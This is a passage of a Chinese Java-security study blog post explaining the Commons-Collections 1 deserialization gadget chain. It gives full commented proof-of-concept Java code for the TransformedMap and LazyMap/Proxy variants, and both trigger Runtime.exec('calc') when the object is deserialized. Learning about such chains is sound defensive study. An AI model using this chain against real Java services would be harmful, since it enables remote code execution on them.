class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// 将上面的步骤串联起来，形成一个完整的执行链</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">// =============================================================</span><br>        <span class="hljs-comment">// 第二步：准备触发环境 (The Trap)</span><br>        <span class="hljs-comment">// 目标：创建一个 Map，当它的 Entry 被修改(setValue)时，自动触发上面的链条</span><br>        <span class="hljs-comment">// =============================================================</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">// 【关键细节】Key 必须是 &quot;value&quot;</span><br>        <span class="hljs-comment">// 为什么？因为后面我们要利用 Retention 注解，它唯一的属性方法就叫 value()</span><br>        <span class="hljs-comment">// AnnotationInvocationHandler 会检查 Map 的 Key 是否和注解的属性名一致</span><br>        innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br><br>        <span class="hljs-comment">// 使用 TransformedMap 包装，配置 transformChain</span><br>        <span class="hljs-comment">// 这里的逻辑是：每当 Map 里的值被修改，就会执行 transformerChain.transform(修改的值)</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br><br>        <span class="hljs-comment">// =============================================================</span><br>        <span class="hljs-comment">// 第三步：封装进反序列化入口类 (The Entry Point)</span><br>        <span class="hljs-comment">// 目标：找到一个 JDK 自带的类，它的 readObject 方法里会自动修改 Map 的值</span><br>        <span class="hljs-comment">// 这个类就是：sun.reflect.annotation.AnnotationInvocationHandler</span><br>        <span class="hljs-comment">// =============================================================</span><br><br>        <span class="hljs-comment">// 1. 获取这个私有类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><br>        <span class="hljs-comment">// 2. 获取构造函数 (它接收两个参数：注解类, Map)</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br><br>        <span class="hljs-comment">// 3. 暴力访问私有构造函数</span><br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 4. 实例化对象</span><br>        <span class="hljs-comment">// 传入 Retention.class 作为注解类型</span><br>        <span class="hljs-comment">// 传入我们精心构造的 outerMap</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> construct.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-comment">// =============================================================</span><br>        <span class="hljs-comment">// 第四步：模拟序列化与反序列化 (The Attack)</span><br>        <span class="hljs-comment">// 在真实攻击中，这一步是把数据发送给服务器</span><br>        <span class="hljs-comment">// =============================================================</span><br><br>        <span class="hljs-comment">// 1. 序列化 (生成恶意二进制流)</span><br>        <span class="hljs-comment">// 1. 创建一个字节数组输出流（容器）</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-comment">// 2. 创建一个对象输出流（工人），并告诉它把数据写到上面的容器里</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        <span class="hljs-comment">// 3. 工人开始干活：把对象冻结（序列化）并写入容器</span><br>        oos.writeObject(payload);<br>        <span class="hljs-comment">// 4. 关闭流（好习惯）</span><br>        oos.close();<br><br>        <span class="hljs-comment">// 打印看看生成了多少字节</span><br>        System.out.println(<span class="hljs-string">&quot;Payload 生成成功，长度: &quot;</span> + barr.size() + <span class="hljs-string">&quot; 字节&quot;</span>);<br><br>        <span class="hljs-comment">// 2. 反序列化 (模拟服务端接收并解析)</span><br>        <span class="hljs-comment">// 这一行代码执行时，计算器就会弹出！</span><br>        System.out.println(<span class="hljs-string">&quot;开始反序列化...&quot;</span>);<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="ysoserial版"><a href="#ysoserial版" class="headerlink" title="ysoserial版"></a>ysoserial版</h1><p>在ysoserial中，cc1链使用的不是这里展示的transformermap，而是lazymap，这2者的触发方式是不一样的，traansformermap是在sevalue，put的时候会触发，而lazymap是在get的时候触发，我们来看p神的pdf中是怎么说的</p>
+<p><img src="https://origin.picgo.net/2026/03/18/1773815643209-341c4536-d0e4-4390-b0f6-f8f42b56318863778448dac0c191.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是吧，在之前那个annotationinvocationhandler的readobject方法中并没直接调用map的get方法，不过在annotationinvocationhandler类的invoke方法中有调用到get<br><img src="https://origin.picgo.net/2026/03/18/1773816308728-c8987224-a027-416d-a651-f0209c81b10b22837b3c1ca25ece.png" srcset="/img/loading.gif" lazyload></p>
+<p>为了能调用这个invoke方法，我们需要用到对象代理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Map proxyMap = (Map) Proxy.newProxyInstance(Map.<span class="hljs-keyword">class</span>.getClassLoader(), new Class[] &#123;Map.<span class="hljs-keyword">class</span>&#125;, handler);<br></code></pre></td></tr></table></figure>
+
+<p>第一个参数是ClassLoader，默认即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了invocationhandler接口的对象，里面有具体代理逻辑。</p>
+<p>对象代理其实就是劫持内部方法调用：通过代理机制，把对象的所有方法请求都拦截到一个统一的入口（invoke），这样就可以在不改变原有代码逻辑的情况下，偷偷修改，增加或替换掉对象。</p>
+<p>而我们的annotationinvocationhandler这个类实际上就是一个invocationhandler，只要将这个对象用proxy代理，然后在readobject的时候，随意调用任意方法，就会进入annotationinvocationhandler的invoke方法，进入了之后触发lazymap的get，然后触发tranform，然后就触发transformerchain。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 1. 构造 Transformer 数组：这是我们的“核心弹药”</span><br>        <span class="hljs-comment">// 目标：通过反射最终执行 Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br>        <span class="hljs-comment">// 为什么不直接传 Runtime 对象？因为 Runtime 类没实现 Serializable 接口，没法直接序列化。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">// 传入 Runtime.class (Class对象可以序列化)，作为链条起点</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// 反射调用 getMethod(&quot;getRuntime&quot;, null)，返回 getRuntime 方法对象</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-comment">// 反射调用 invoke(null, null)，即执行 Runtime.getRuntime()，返回 Runtime 实例</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-comment">// 反射调用 exec(&quot;calc.exe&quot;)，最终触发命令执行</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br><br>        <span class="hljs-comment">// 将多个 Transformer 串联成一个链条</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">// 2. 构造 LazyMap (炸弹本体)</span><br>        <span class="hljs-comment">// LazyMap 的特性：当你调用 get() 方法获取一个不存在的 Key 时，它会自动触发内部的 transform 逻辑</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-comment">// 3. 构造第一个 AnnotationInvocationHandler (内部中介/雷管)</span><br>        <span class="hljs-comment">// 这个类实现了 InvocationHandler 接口，它的 invoke() 方法中会调用 memberValues.get()</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-literal">true</span>);<br>        <br>        <span class="hljs-comment">// 这里的 outerMap (LazyMap) 被放进了 handler 的 memberValues 属性中</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-comment">// 4. 构造代理对象 proxyMap (劫持/绊线)</span><br>        <span class="hljs-comment">// 任何对 proxyMap 的方法调用（如 entrySet, size等）都会被转发给 handler 的 invoke() 方法</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(<br>                Map.class.getClassLoader(), <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, <br>                handler<br>        );<br><br>        <span class="hljs-comment">// 5. 构造第二个 AnnotationInvocationHandler (最外层外壳/快递盒)</span><br>        <span class="hljs-comment">// 这一步是真正的入口：我们将 proxyMap 传进去。</span><br>        <span class="hljs-comment">// 当反序列化这个对象时，它的 readObject() 会被触发。</span><br>        <span class="hljs-comment">// readObject() 内部会执行 memberValues.entrySet()，此时 memberValues 是 proxyMap。</span><br>        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-comment">// --- 至此，利用链构造完成，下面开始测试序列化与反序列化 ---</span><br><br>        <span class="hljs-comment">// 序列化：将 handler 对象变成字节流</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(handler);<br>        oos.close();<br><br>        <span class="hljs-comment">// 反序列化：模拟服务器收到字节流并解析</span><br>        <span class="hljs-comment">// 触发顺序：</span><br>        <span class="hljs-comment">// 1. handler.readObject() -&gt; 执行 proxyMap.entrySet()</span><br>        <span class="hljs-comment">// 2. proxyMap 拦截到调用 -&gt; 转发给第一个 handler.invoke()</span><br>        <span class="hljs-comment">// 3. handler.invoke() -&gt; 执行 outerMap.get()</span><br>        <span class="hljs-comment">// 4. outerMap (LazyMap) 发现 Key 不存在 -&gt; 触发 transformerChain</span><br>        <span class="hljs-comment">// 5. 命令执行：calc.exe</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>该poc出自p神原文，我只是搬运过来，然后ai加上注释</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/note/" class="category-chain-item">note</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/javasec/" class="category-chain-item">javasec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/javasec/">#javasec</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java安全学习笔记5-CC1链</div>
+      <div>https://rightevil.github.io/Java安全学习笔记5-CC1链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rightevil</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B/" title="最近的一些比赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">最近的一些比赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/bugku-sql%E6%B3%A8%E5%85%A5-wp/" title="bugku-sql注入 wp">
+                        <span class="hidden-mobile">bugku-sql注入 wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="lv-container" data-id="city" data-uid="MTAyMC81NzQyNC8zMzg4OA==">
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#lv-container', function() {
+        Fluid.utils.createScript('https://cdn-city.livere.com/js/embed.dist.js');
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
